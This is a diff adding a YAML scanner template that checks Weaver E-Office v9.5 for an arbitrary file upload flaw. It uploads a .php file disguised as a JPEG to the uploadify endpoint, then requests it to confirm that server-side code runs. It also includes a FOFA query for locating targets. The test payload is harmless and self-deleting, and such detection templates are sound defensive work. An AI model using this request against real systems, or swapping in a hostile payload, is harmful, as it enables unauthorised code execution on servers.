@@ -1,0 +1,46 @@
+id: eoffice-v9-file-upload
+
+info:
+  name: 泛微标准协同办公平台 E-Office v9.5 任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: false
+  description: |
+    weaver E-Office v9.5 file upload vulnerability
+    official website:https://www.e-office.cn/
+    FOFA: app="泛微-EOffice"
+  reference:
+    - https://github.com/sunyixuan1228/cve/blob/main/weaver.md?ref=www.ctfiot.com
+    - https://www.ctfiot.com/116750.html
+  tags: eoffice,upload
+  created: 2023/07/11
+
+set:
+  randstr: randomLowercase(9)
+  randbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /inc/jquery/uploadify/uploadify.php
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"Fdiledata\";filename=\"{{randstr}}.php\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <?php echo \"{{randbody}}\";unlink(__FILE__);?>\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: 'response.status == 200 && "[0-9]{10}".bmatches(response.body)'
+    output:
+      search: '"(?P<filename>[0-9]{10})".bsubmatch(response.body)'
+      filename: search["filename"]
+  r1:
+    request:
+      method: GET
+      path: /attachment/{{filename}}/{{randstr}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
